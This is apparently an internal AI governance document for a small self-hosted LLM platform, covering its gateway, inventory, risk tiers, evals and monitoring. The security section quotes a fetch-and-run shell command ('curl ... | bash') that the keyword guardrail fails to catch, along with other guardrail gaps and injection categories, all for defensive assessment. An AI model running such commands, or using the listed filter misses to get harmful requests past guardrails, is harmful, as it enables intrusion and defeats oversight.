# AI Governance — the standing position

**What this is.** How AI governance works on this platform, what it's enforced by, and where it
currently falls short. This is the **position**; the execution backlog is
[`todos.md` #36–#50](../todos.md). If you're adding an AI system, read this and
[adding-an-app.md](adding-an-app.md).

**Last reviewed:** 2026-07-22 · **Owner:** Paul Vilevac · **Review cadence:** quarterly, plus on any
new external-facing AI surface.

> **Implementation status (2026-07-22).** The backlog #36–#46 has been **largely built**, not just
> filed — each item landed with a live negative test and a scheduled check. What's genuinely still open
> is small: the public **AI-use notice**
> handed to the sibling repos ([#44](../todos.md)), 
> Egress *blocking* was evaluated and **closed by decision** (detect + policy; IP-blocking rejected as it
> breaks CDN-shared traffic — [#39/#39b](../todos.md)). Everything else on the ten axes is enforced and tested.

---

## 1. The thesis

**Governance that isn't technically enforced is advisory.**

Most AI governance programs are a policy problem, which is why most of them are theater — a document
asserting that models are used responsibly, with nothing in the system that would behave differently if
they weren't. The useful mental model is three layers:

| Layer | Answers | Where it lives here |
|---|---|---|
| **Governance** | Who decides, who's accountable | This doc + the owner field in the inventory; [acceptable-use](ai-acceptable-use.md) + [incident runbook](ai-incident-response.md) |
| **Management** | What the lifecycle is | Registry, gates, evals, exceptions → `todos.md` #36/#37/#42 |
| **Enforcement** | How any of it becomes *physically true* | **Control points (§3)** — the gateway that won't authenticate an unapproved system, the generator that won't wire a private corpus into a public bot, the check that fails the build, the log pipeline that redacts a leaked key |

We optimize for the third layer. The reference frameworks (§6) describe *what* to govern well and *how
to enforce it* barely at all — that gap is where the engineering is.

**The practical test:** for every claim in this document, ask *"what would break if someone violated
it?"* If the answer is "nothing, but they shouldn't," it's advisory, and it belongs in the backlog as an
enforcement item — not here as a claim.

---

## 2. Scope and proportionality

This platform runs a shared local LLM, an embedding model, a RAG/KB layer, agent workflows, and two
public internet-facing chat surfaces, serving a two-person company, a family, and several sibling
product repos. It is **not** a regulated enterprise deployment, and the governance here is deliberately
sized to that.

Two things push it above hobby-grade anyway:

1. **Real consequence exists in places.** Public surfaces take input from strangers; `example-app`
   sits in the path of real money; `research-app` will handle entitled third-party feeds. Those
   deserve real controls. A personal ComfyUI instance does not. That asymmetry is the whole reason for
   risk tiering (§4).
2. **This repo is a reference architecture heading for open source** ([`todos.md` #14](../todos.md)).
   Governance we can *demonstrate* is part of what the repo is for.

**What we deliberately do NOT do,** and why — proportionality cuts both ways:

- **No governance body or review committee.** Two developers. A committee here would be pure ceremony
  and the bottleneck failure mode. Ownership is federated per system; this repo owns the schema and
  the gates (hub-and-spoke).
- **No formal bias/fairness program.** Wrong proportionality for internal tooling. Harm-category
  refusal tests on the *public* surfaces are folded into the eval suite instead ([#42](../todos.md)).
- **No ISO 42001 certification pursuit.** We borrow its structure; we're not buying an audit.
- **No model training.** We run open-weight models as-is. Training-data governance is therefore
  out of scope; **corpus** governance ([#43](../todos.md)) is very much in.

---

## 3. Control points — where governance is actually enforced

Governance operates at a high level precisely when it's enforced in a **small number of places**. Four
control points cover the platform. Every governance question should reduce to one of them; if a new
control needs a fifth, that's a design smell worth arguing about.

| # | Control point | Enforces | Status |
|---|---|---|---|
| **1** | **Traefik + Keycloak** (middleware chains, `secure-sso@file` / `secure-chain@file`, oauth2-proxy) | *Who reaches what.* No service is exposed without an explicit chain; SSO is one label, not a per-app integration | ✅ **Operating** |
| **2** | **Infisical** (`pull-secrets.sh` / `push-secret.sh`) | *What credentials exist.* Single source of truth; `.env` is a generated artifact; hand-editing on the host is a documented violation | ✅ **Operating** |
| **3** | **LiteLLM gateway** (virtual keys, model scoping, Langfuse tracing) | *What may talk to a model, and every call is recorded* | ✅ **Operating** — scoping, budgets, rate limits, expiry all applied per tier and **429 negative-tested**; no runtime consumer holds the master key; the host LLM is closed to the LAN. Container egress to cloud providers is **detected + policy-gated** (IP-blocking rejected on evidence, SNI proxy filed [#39b](../todos.md)). Since **2026-07-23** the gateway fronts three third-party models via OpenRouter — so the control point is no longer theoretical: those calls are scoped, budgeted, rate-limited and Langfuse-attributed exactly like local ones |
| **4** | **AI inventory + AI-BOM** | *What is approved to exist.* Approval in the registry **is** the credential — an unregistered system can't authenticate | ✅ **Operating** — `docs/ai-inventory.yml` + a generated BOM, drift-checked in CI (static) and weekly on jarvis (live), alerting via Alertmanager → Discord |

A fifth surface, **the log pipeline (Promtail → Loki)**, is where governance is *un-done* if unattended:
services echo secrets to stdout that we don't control at the source (the host LLM printed its API key in
its startup banner). Promtail now **redacts by shape** before storage, and Loki's delete API purges what
already leaked ([#12/#49](../todos.md)). It's a guard rail on the other four, not a fifth control point.

Two structural principles behind these:

- **Approval should be the credential, not a document about the credential.** Minting a virtual key
  reads the inventory; a system with no entry gets no key. That's how a registry stops being a
  spreadsheet.
- **The audit answer should be an artifact, not a memory.** "What AI systems do we run, who owns them,
  what data do they touch" is answerable by running `build-ai-bom.py`, and **"what did system X do on
  a given day" is answerable too** — `SELECT * FROM ai_governance.daily_by_system` — because traces
  carry the key alias and a slim, **append-only, tamper-resistant** record outlives the 14-day trace TTL.

**And the tension to hold:** *enablement vs. control.* Clamp down and you create shadow AI. The paved
road has to be **faster** than the goat path — which is why #38 warns against over-tightening internal
limits at the same time #39 closes the bypass. Do only the second and people route around you; do only
the first and there's nothing to route around.

---

## 4. Risk tiers

Controls are applied proportionally to **impact if the system goes wrong** — not to how impressive the
model is. Defined in [`ai-risk-tiers.md`](ai-risk-tiers.md), stored as a field per system in
[`ai-inventory.yml`](ai-inventory.yml), and enforced by the drift checker:

| Tier | Meaning | Examples here |
|---|---|---|
| **T0** | Sandbox / personal. No external data, no public surface, no money or identity impact | ComfyUI |
| **T1** | Internal assistive. Internal users and corpora; a human reads every output | OpenWebUI, the KB chat, Assistant |
| **T2** | External-facing **or** autonomous — a public surface, or acts without a human in the loop per action | `chat.example.com`, `chat.example-site.ai`, scheduled n8n agent flows, Home Assistant control |
| **T3** | Consequential. Money, safety, or irreversible action | Anything touching the markets execution path; anything with write access to a system of record |

Required controls escalate with tier — scoped key (all) → budget + rate limit (T1+) → attributable trace
(T1+) → named human-oversight point (T2+) → input/output guardrails (T2+) → eval gate (T2+) → owner +
incident runbook (T2+) → step-up or two-person approval on the consequential action (T3).

**The matrix is worthless if it's prose** — so it's encoded as `MATRIX{}` in
[`build-ai-bom.py`](../docker/ai/inventory/build-ai-bom.py), and most rows now have a *live enforcer*,
not a backlog reference: scoped credential, budget, rate limit, expiry and oversight in the drift check;
input/output guardrails and the eval gate in the daily suite; corpus isolation in the KB generator. The
few still marked to a `todos.md` item (e.g. T3 two-person approval) are the honest remainder. **That
migration — each row moving from a reference to an enforcer — was the governance program, and it's
mostly done.**

---

## 5. Current posture by axis

Honest, as of **2026-07-22**, verified against the live platform rather than inferred — and updated
after the first implementation pass. Anything marked ✅ has a **negative test** behind it and a weekly
job that fails loudly; anything marked ⚠️ or ❌ says what is actually missing.

| Axis | Posture | Evidence / gap |
|---|---|---|
| **Accountability & oversight** | ✅ Operating | Named owner + named human-oversight point per system; a **tested** kill-switch (revoke → 401); an [incident runbook](ai-incident-response.md) and [acceptable-use page](ai-acceptable-use.md). **Closed 2026-07-24:** the public-transcript review is now a weekly job with an artifact, four metrics and a dead-man — and, unusually, a **second dead-man on the human**: `AiOversightUnacknowledged` fires if nobody runs `--ack` in 14 days, because the realistic failure of periodic review is that it keeps generating and nobody reads it. See `docker/ai/oversight/` |
| **Inventory & lifecycle** | ✅ Operating | `ai-inventory.yml` (11 systems + 6 platform components) + a generated AI-BOM; drift fails CI (static) and alerts weekly (live). Earned its keep on run one: caught 3 master-key consumers, 14 unbounded-key violations, and 6.9 GB of unregistered model weights |
| **Risk classification** | ✅ Operating | T0–T3 + a control matrix **encoded as `MATRIX{}`** in the checker — tier requirements are executable, not prose → [`ai-risk-tiers.md`](ai-risk-tiers.md) |
| **Data governance** | ✅ Operating | Every corpus carries owner/visibility/classification/licence/retention/`contains_pii`, and the KB generator **refuses to build** from an incomplete manifest or to wire a non-public corpus into a public surface (**both negative-tested**). `kb-standards.md` §6 and the manifest re-synced → [#43](../todos.md) |
| **Security** | ✅ Strong / ⚠️ one gap | Keycloak + Traefik chains, three-network segmentation, Infisical, least-privilege roles **proven by negative test**, pinned images, CI, **model weights hash-pinned + verified weekly** (#45), host LLM **no longer LAN-reachable** (#39), and **secrets redacted in logs** (#49). **Narrowed 2026-07-23:** gateway **guardrails** now run `pre_call` and `default_on` across every consumer — the five `prompt_injection_*` categories plus **two we wrote ourselves** (`homelab_malicious_code`, which drops the builtin's ops-vocabulary collateral, and `homelab_prompt_leak`, which catches indirect extraction the builtin missed). **Both directions are eval-gated**: blocking-tested for injections AND for false positives, because the realistic failure is a filter that quietly eats real work (`denied_medical_advice` blocked "diagnose why the container keeps restarting", so it is off). Still open: this is **keyword matching, not a semantic classifier** — measured miss: `curl http://x.sh | bash` passes. Resolved scope bug (#53, 2026-07-24): the `default_on` guardrails also filter `/embeddings`, which blocked ingestion of first-party docs containing phrases like "enable … override". Since LiteLLM can't gate guardrails by call-type (an upgrade to 1.93.0 was tested and doesn't fix it), the KB ingest now embeds **direct to bge-m3**, bypassing the gateway for that one lowest-risk call class (embeddings have no injection surface); chat still routes through the guardrails. → [#41](../todos.md)/[#53](../todos.md) |
| **Privacy** | ✅ Mostly | **Measured, not assumed**: the research corpora hold published-author attribution, not member identities (12,948 points, **zero Discord-sourced**) — #44's premise was wrong. A per-source **erasure path** exists and is negative-tested; trace-body retention is a recorded decision (14d full / 13mo hashes). Remaining: the public AI-use notice, handed to the sibling repos → [#44](../todos.md) |
| **Transparency & traceability** | ✅ Operating | Traces carry `user_api_key_alias`, so every call is **attributable to an inventory system**; a slim **13-month** audit record (hashes, no bodies) survives Langfuse's 14-day TTL, and it's now **append-only** — the writer role is denied DELETE/DROP (negative-tested). Remaining: covers only traffic through the gateway ([#39](../todos.md)) |
| **Output safety** | ⚠️ Partial | The text2cypher path is guarded (auth + write-verb denylist + clause allowlist + LIMIT cap + every statement logged) and **regression-tested** — asked to delete the graph, the model emits `DETACH DELETE` and the guard refuses it. **Closed 2026-07-24:** harm-category refusal is now **eval-gated** — weapons, child-safety, self-harm and racial-bias probes are BLOCKING cases that assert a `400` from the gateway guardrail. One case is deliberately **advisory**: "step by step instructions to seriously injure someone" is NOT caught by the keyword list and is declined by the *model* — defence-in-depth, not a control, so asserting it would encode a guarantee we do not have. That honest split is the remaining argument for [#41](../todos.md) |
| **Reliability & monitoring** | ✅ Operating | Infra monitoring as before, plus a **9-case eval suite** (7 blocking) running daily and **negative-tested** — widening a key's scope makes it fail. **15 AI-specific alert rules across 5 groups** (`ai-governance`, `ai-egress`, `ai-model-integrity`, `ai-audit`, `ai-evals`), every group with a dead-man |
| **Third-party & shadow AI** | ✅ Detect + policy (block deferred, by decision) | Hostname-accurate **detection** ships (`check-egress.sh` + AdGuard, weekly, dead-man). **Changed 2026-07-23:** the platform is no longer local-only — three `openrouter/*` models are configured on the gateway for testing/demo, on a **dedicated `openwebui-external` key** with an **enforced `max_budget` of $5/30d** that binds before the **$10 prepaid credit** (auto-recharge off) — the ceiling is arithmetic, not trust. Which limits actually enforce was **measured, not assumed**: deployment-level `rpm`/`tpm`, `enable_pre_call_checks`, `usage-based-routing-v2` and key `tpm_limit` all failed to bite under a 65k-token/minute push; only key `rpm_limit` and `max_budget` returned 429. The unenforcing config was removed rather than left in place looking like a control. The detector was updated in the same change to split **sanctioned** providers (configured on the gateway → expected) from unsanctioned ones, and a new `homelab_ai_egress_unsanctioned_dns_queries` metric carries the anomaly signal — otherwise a permanent weekly "SEEN openrouter.ai" would have trained us to ignore the control. The acceptable-use policy names the rule and lists the three models; the inventory drift-check flags a new provider consumer (**negative-tested 2026-07-23**: dropping a model from the inventory while the key still allowed it raised `model_scope_drift`). IP-level *blocking* was evaluated and **rejected on evidence** — providers sit on Cloudflare/Google **shared anycast IPs**, so dropping them collaterally breaks legit web fetch + the public tunnels ([`egress-decision.md`](egress-decision.md)). The real block (an SNI proxy) is filed [#39b](../todos.md), trigger-gated |

**Summary judgment (updated 2026-07-22, after the implementation pass).** The enforcement spine —
**inventory → credential → chokepoint** — is built and tested: #36/#37 made the registry and control
matrix executable; #38 bounded every credential and ended master-key runtime use; #40 made traces
attributable and the audit record append-only; #41 closed a live unauthenticated-text2cypher hole and
guarded the output; #42 gates all of it with a daily eval suite; #43 made corpus isolation a data
property the generator enforces; #44 replaced #44's wrong premise with measurement and built the erase
path; #45 pinned the model supply chain; #39 closed the host LLM to the LAN; #49 stopped secrets
reaching the logs.

**All ten axes are now either enforced-and-tested or closed by a documented, evidence-based decision.**
The last "gap" — shadow-AI *blocking* — turned out on inspection to be an IP-blocking approach that
would break legitimate CDN-fronted traffic (providers share Cloudflare/Google anycast IPs), so it was
replaced by detect-and-alert + policy + no-cloud-configured, with an SNI-filtering egress proxy filed
([#39b](../todos.md)) for the day a trigger makes it proportionate. That is the honest close: not every
gap is a build — some are a decision, made on evidence and written down.

The pattern worth keeping: every item landed with a **negative test** — a 429, a `connection refused`,
a corrupted hash, a revoked key returning 401, a `DETACH DELETE` refused, a canary secret redacted, a
`DELETE … Not enough privileges` — and a **scheduled job that fails loudly**. A control nobody tests is
a belief.

---

## 6. Reference frameworks

Borrowed for structure and vocabulary, not compliance:

- **NIST AI RMF** (+ Generative AI Profile, AI 600-1) — the Govern / Map / Measure / Manage functions.
  **Measure** was our weakest and is now covered: a daily eval suite, weekly drift/model/egress checks,
  and an attributable audit trail. The thinnest function today is the *Manage* sub-item of **containing**
  third-party use — egress is measured but not yet blocked (§5).
- **ISO/IEC 42001** — AI management-system structure (Annex SL: §5 leadership, §6 planning, §8
  operation, §9 performance evaluation, §10 improvement). Used as a checklist, not a certification target.
- **EU AI Act** — the risk-tier vocabulary (prohibited / high-risk / limited / minimal) behind §4, and
  the **limited-risk transparency** obligation — disclose that a human is interacting with AI — which is
  why the public-surface notice is in [#44](../todos.md).
- **OWASP Top 10 for LLM Applications** — the security slice: prompt injection (LLM01), insecure output
  handling (LLM02), supply chain (LLM03), poisoning (LLM04), excessive agency (LLM06), unbounded
  consumption (LLM10). **Vetted item-by-item in [owasp-llm-top10-coverage.md](owasp-llm-top10-coverage.md)** — 5 enforced-and-tested, 4 partial, 1 gap being closed.
- **MITRE ATLAS** — adversarial taxonomy for threat modeling AI-specific attack paths.

> **Currency caveat.** The **axes are stable** — they're the load-bearing structure everything new gets
> bolted onto. The **specifics move**: ISO 42001 certification practice and EU AI Act guidance have both
> been evolving through 2025–2026. Re-verify dates, phase-in deadlines, and clause references before
> citing them externally or to a customer. Treat the framework references above as a map, not a citation.

---

## 7. How this stays operating (and doesn't become theater)

A filed backlog is not a program. Four things convert it:

1. **A scheduled check for every claim.** Each backlog item terminates in something that runs on a
   cadence and **fails loudly** — weekly inventory drift, the eval suite, model-hash verification. This
   is the pattern [`verify-backups.sh`](../docker/verify-backups.sh) already proved: verify the
   *restore* side, don't trust the write side. A control nobody tests is a belief.
2. **Alerting through the existing path.** Every signal — eval failure, budget breach, guardrail trip,
   shadow-AI egress, inventory drift — goes to Alertmanager → Discord. No second notification channel,
   and nothing that requires a human to remember to look.
3. **Federated ownership, central schema.** Sibling repos (`assistant-app`, `web-app`, `example-app`,
   `research-app`, `content-curator`, `example-site-web`, `home-assistant-infra`) own their
   inventory entry's *content* and propose their own tier. This repo owns the schema and the gate.
   Handoffs go in **their** repo per [`CLAUDE.md`](../CLAUDE.md) — don't edit sibling configs.
4. **Honest status, dated.** §5 is a live posture table, not an aspiration. When something is absent it
   says absent. A governance doc that reads as uniformly green is the tell that nobody's checking.

**The enforcement spine — [#36](../todos.md) inventory → [#38](../todos.md) bounded credentials →
[#39](../todos.md) chokepoint — is the load-bearing structure; everything else is refinement on top of
it.** Two of the three are done and tested. The third is half-done: the host LLM is closed to the LAN,
but container **egress to public providers is detected, not blocked** — that's the single most valuable
remaining piece, and it's a real system to build (a per-network egress proxy only the gateway may
bypass), not a setting to flip. Refinement without the spine is exactly the theater this document exists
to avoid; the spine is now real.

### Scheduled checks (the program, as cron)

The whole thing is only as alive as its scheduled checks. Current cadence on jarvis, each publishing to
Prometheus and alerting via Alertmanager → Discord with a dead-man:

| Check | When | Guards |
|---|---|---|
| `build-ai-bom.py --live` | weekly Sun 03:30 | inventory drift, shadow credentials, unattributed traces |
| `check-egress.sh` | weekly Sun 03:40 | container → public-provider paths |
| `verify-models.sh` | weekly Sun 04:00 | model-weight integrity + unregistered weights |
| `export-audit.sh` | **daily** 02:30 | harvests the audit record before the 14-day trace TTL |
| `run-evals.py` | **daily** 03:10 | the security/isolation guardrails |
| `verify-backups.sh` | weekly Sun 03:00 | (pre-existing) restore-side backup content |

---

## Related

| Topic | Doc |
|---|---|
| Execution backlog (#36–#50) | [`todos.md`](../todos.md) |
| Risk tiers + control matrix | [ai-risk-tiers.md](ai-risk-tiers.md) |
| AI incident response + kill-switch | [ai-incident-response.md](ai-incident-response.md) |
| Acceptable use | [ai-acceptable-use.md](ai-acceptable-use.md) |
| The inventory / generated AI-BOM | [ai-inventory.yml](ai-inventory.yml) · [ai-bom.md](ai-bom.md) |
| AI-BOM generator + drift check | [`docker/ai/inventory/README.md`](../docker/ai/inventory/README.md) |
| Attributable audit trail (append-only) | [`docker/ai/audit/README.md`](../docker/ai/audit/README.md) |
| Eval suite (guardrail regression gate) | [`docker/ai/evals/README.md`](../docker/ai/evals/README.md) |
| Model-weight provenance + integrity | [`docker/ai/models/README.md`](../docker/ai/models/README.md) |
| Secret redaction in logs | [`docker/monitoring/loki/README.md`](../docker/monitoring/loki/README.md) |
| Adding an app/service (the workflow governance hooks into) | [adding-an-app.md](adding-an-app.md) |
| Identity, SSO, per-app auth decisions | [`docker/core/keycloak/README.md`](../docker/core/keycloak/README.md) |
| Routing, middleware chains, exposure | [`docker/core/traefik/README.md`](../docker/core/traefik/README.md) |
| Secrets (Infisical) | [`docker/core/infisical/README.md`](../docker/core/infisical/README.md) |
| LLM gateway + virtual keys | [`docker/ai/litellm/README.md`](../docker/ai/litellm/README.md) |
| Gateway choice: LiteLLM vs Kong (decision) | [gateway-decision.md](gateway-decision.md) |
| Shadow-AI egress: detect vs block (decision) | [egress-decision.md](egress-decision.md) |
| KB standards + corpus registry | [kb-standards.md](kb-standards.md) · [kb-manifest.json](kb-manifest.json) |
| Vulnerability reporting (different thing) | [`SECURITY.md`](../SECURITY.md) |
